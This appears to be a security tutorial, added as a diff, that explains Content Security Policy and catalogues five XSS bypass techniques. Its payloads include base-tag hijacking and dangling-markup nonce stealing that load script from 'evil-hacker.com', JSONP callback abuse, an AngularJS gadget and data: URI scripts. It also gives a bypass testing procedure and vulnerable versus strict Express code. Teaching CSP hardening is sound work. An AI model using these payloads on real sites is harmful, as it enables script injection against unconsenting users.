@@ -1,0 +1,262 @@
+# Cross-Site Scripting (XSS): CSP Protection & CSP Bypass Techniques
+
+Many developers assume their web applications are completely immune to XSS simply because they have configured a **Content Security Policy (CSP)** header. In practice, however, **over 90% of real-world CSP implementations contain misconfigurations** that allow attackers to bypass the policy and execute arbitrary JavaScript.
+
+This module explores the mechanics of CSP, policy evaluation techniques, and advanced **CSP Bypass** vectors commonly encountered during penetration tests and PortSwigger Web Security labs.
+
+---
+
+## 1. What is Content Security Policy (CSP)?
+
+**Content Security Policy (CSP)** is an HTTP response header (`Content-Security-Policy`) enforced by modern web browsers to provide **Defense-in-Depth**.
+
+Its primary objective is restricting the sources from which browsers are permitted to load and execute resources (*scripts, images, stylesheets, objects, and fonts*).
+
+### Example CSP Header:
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
+```
+
+If an XSS vulnerability allows an attacker to inject `<script>alert(1)</script>` or `<script src="https://evil.com/xss.js">`, the browser **rejects script execution** because the injected source violates the active policy rules!
+
+---
+
+## 2. CSP Anatomy & 4 Core Bypass Vectors
+
+![CSP Defense & Bypass Matrix](/images/xss-csp-bypass-matrix.svg)
+
+---
+
+## 3. Essential CSP Directives
+
+| Directive | Function & Security Purpose |
+| :--- | :--- |
+| **`script-src`** | Specifies authorized sources for JavaScript execution. |
+| **`default-src`** | Fallback policy for unspecified resource directives. |
+| **`base-uri`** | Restricts valid URLs for the document's `<base>` element. **Omitting this is a critical vulnerability!** |
+| **`object-src`** | Controls execution of browser plugins (Flash, Java). Must always be set to `'none'`. |
+| **`nonce-{random}`** | A cryptographic, per-request token. Only `<script nonce="...">` elements with matching values execute. |
+| **`'strict-dynamic'`** | Enables transitive trust: authorized scripts with valid nonces can load dynamic child scripts. |
+| **`'unsafe-inline'`** | Permits inline `<script>` blocks and `onclick` event attributes (high risk). |
+| **`'unsafe-eval'`** | Permits string-to-code execution methods (`eval()`, `Function()`). |
+
+---
+
+## 4. Catalog of 5 Common CSP Bypass Techniques
+
+Here are the primary methodologies used by security researchers and bug bounty hunters to circumvent CSP restrictions:
+
+---
+
+### Bypass 1: Base-URI Hijacking (Missing `base-uri` Directive)
+
+This bypass targets applications that enforce strict nonce-based policies (`script-src 'nonce-xyz'`), but **fail to specify a `base-uri 'none'` or `base-uri 'self'` directive**.
+
+#### Target Environment:
+The server sends a strict nonce policy:
+```http
+Content-Security-Policy: default-src 'self'; script-src 'nonce-K3yR4nd0m123';
+```
+And renders a legitimate script using a relative path:
+```html
+<!-- Legitimate application script with a valid server nonce -->
+<script nonce="K3yR4nd0m123" src="/static/js/main.js"></script>
+```
+
+#### Exploitation:
+The attacker injects a `<base>` tag into any HTML injection sink:
+```html
+<base href="https://evil-hacker.com/">
+```
+
+#### Why it Works:
+1. The `<base>` tag resets the base URI for all relative paths in the DOM.
+2. When the browser evaluates `<script nonce="K3yR4nd0m123" src="/static/js/main.js">`, it resolves the request to:
+   `https://evil-hacker.com/static/js/main.js`
+3. Because the `<script>` element **contains the authentic server nonce**, the browser permits full execution of the attacker's payload!
+
+---
+
+### Bypass 2: Whitelisted JSONP & CDN Endpoint Abuse
+
+Applications frequently whitelist major CDN domains in their policy:
+```http
+Content-Security-Policy: script-src 'self' https://*.google.com https://cdnjs.cloudflare.com;
+```
+
+#### Exploitation:
+Many third-party endpoints support **JSONP (JSON with Padding)**, returning executable JavaScript based on a `callback` parameter:
+
+```html
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)"></script>
+```
+
+#### Why it Works:
+1. The domain `accounts.google.com` satisfies the CSP whitelist (`https://*.google.com`).
+2. The Google endpoint responds with: `alert(document.domain)({"status":"ok"})`.
+3. The browser executes the response as valid JavaScript without violating CSP!
+
+---
+
+### Bypass 3: Nonce Stealing via Dangling Markup
+
+When an injection sink occurs **immediately before** a legitimate nonced script:
+
+#### Original Server HTML:
+```html
+<div class="user-content">USER_INPUT</div>
+<!-- Legitimate nonced script below user input -->
+<script nonce="SecretNonce12345" src="/app.js"></script>
+```
+
+#### Injected Payload:
+The attacker injects an **unclosed** script tag:
+```html
+<script src="https://evil-hacker.com/malicious.js"
+```
+
+#### Rendered HTML:
+```html
+<div class="user-content"><script src="https://evil-hacker.com/malicious.js" 
+<script nonce="SecretNonce12345" src="/app.js"></script>
+```
+The browser's HTML parser treats the unclosed tag as absorbing the subsequent `nonce="SecretNonce12345"` attribute, executing the malicious script with valid credentials!
+
+---
+
+### Bypass 4: Client-Side Template Injection (AngularJS Gadgets)
+
+When inline scripts are prohibited (`'unsafe-inline'` disabled), but the application loads a frontend framework like AngularJS from origin or a CDN:
+
+```http
+Content-Security-Policy: script-src 'self' https://ajax.googleapis.com;
+```
+
+#### Exploitation:
+The attacker avoids `<script>` tags entirely, injecting AngularJS template expressions:
+```html
+<div ng-app ng-csp>
+  {{$on.constructor('alert(document.domain)')()}}
+</div>
+```
+
+#### Why it Works:
+JavaScript code is evaluated internally by AngularJS's legitimate template engine rather than being parsed as new `<script>` tags.
+
+---
+
+### Bypass 5: `data:` URI & `unsafe-eval` Weaknesses
+
+If a policy permits `data:` schemes or includes `'unsafe-eval'`:
+```http
+Content-Security-Policy: script-src 'self' 'unsafe-eval' data:;
+```
+
+Attackers can execute Base64 scripts or evaluate string-based payloads directly:
+```html
+<script src="data:text/javascript,alert(document.domain)"></script>
+```
+
+---
+
+## 5. Step-by-Step CSP Auditing & Bypass Protocol
+
+Follow this testing methodology when assessing CSP-protected targets:
+
+---
+
+### Step 1: Inspect the Target's CSP Header
+Examine response headers in Burp Suite:
+```http
+HTTP/1.1 200 OK
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-xyz' https://trusted-cdn.com;
+```
+
+---
+
+### Step 2: Evaluate Policy Weaknesses with Automated Tools
+Paste the policy into **Google CSP Evaluator** (`https://csp-evaluator.withgoogle.com/`). The tool highlights critical weaknesses:
+* Missing `base-uri`? → Deploy **Base-URI Hijacking**.
+* Whitelisted CDN domains? → Search for **JSONP Endpoints**.
+* Contains `'unsafe-inline'` or `data:`? → Deploy **Inline / Data URI Injection**.
+
+---
+
+### Step 3: Deliver the Tailored Payload & Verify Execution
+1. Construct the context-specific bypass payload (e.g. `<base href="https://exploit-server.net/">`).
+2. Host the payload script on your exploit server.
+3. Verify that the `alert(document.domain)` pop-up executes without CSP violation warnings in the browser console.
+
+---
+
+## 6. Backend Source Code: Vulnerable vs. Strict CSP
+
+### ❌ Vulnerable Implementation (Permissive Whitelists & Missing Directives)
+```typescript
+import express from "express";
+const app = express();
+
+// ❌ VULNERABLE: Domain whitelists vulnerable to JSONP abuse, missing base-uri
+app.use((req, res, next) => {
+  res.setHeader(
+    "Content-Security-Policy",
+    "default-src 'self'; script-src 'self' https://*.google.com https://cdnjs.cloudflare.com 'unsafe-eval';"
+  );
+  next();
+});
+```
+
+---
+
+### ✅ Secure Implementation (Google & OWASP Strict CSP Standard)
+```typescript
+import express from "express";
+import crypto from "crypto";
+import helmet from "helmet";
+
+const app = express();
+
+// 1. Generate unique per-request cryptographic nonce
+app.use((req, res, next) => {
+  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
+  next();
+});
+
+// 2. Enforce Strict Nonce-Based CSP with strict-dynamic
+app.use((req, res, next) => {
+  const nonce = res.locals.cspNonce;
+  res.setHeader(
+    "Content-Security-Policy",
+    [
+      `script-src 'nonce-${nonce}' 'strict-dynamic'`, // Only nonced scripts execute
+      "object-src 'none'",                            // Blocks Flash and plugin objects
+      "base-uri 'none'",                              // ✅ CRITICAL: Prevents Base-URI Hijacking
+      "frame-ancestors 'none'",                       // Prevents Clickjacking
+      "require-trusted-types-for 'script'",           // Mitigates DOM XSS Sinks
+    ].join("; ")
+  );
+  next();
+});
+
+app.get("/", (req, res) => {
+  res.send(`
+    <html>
+      <head>
+        <script nonce="${res.locals.cspNonce}" src="/static/app.js"></script>
+      </head>
+      <body>
+        <h1>Protected by Strict CSP</h1>
+      </body>
+    </html>
+  `);
+});
+```
+
+---
+
+## 7. Key Takeaways for CSP Hardening
+
+1. **Always Set `base-uri 'none'` or `base-uri 'self'`:** Prevent attackers from controlling relative script loading.
+2. **Avoid Third-Party Domain Whitelists:** Adopt **Nonce-based Strict CSP (`'nonce-...' 'strict-dynamic'`)** rather than wide CDN domain whitelists vulnerable to JSONP endpoints.
+3. **Always Enforce `object-src 'none'`:** Close legacy object plugin attack surfaces.
+4. **Remember CSP is Layer Two:** CSP is an added layer of defense, not a replacement for rigorous input validation and context-aware output encoding.
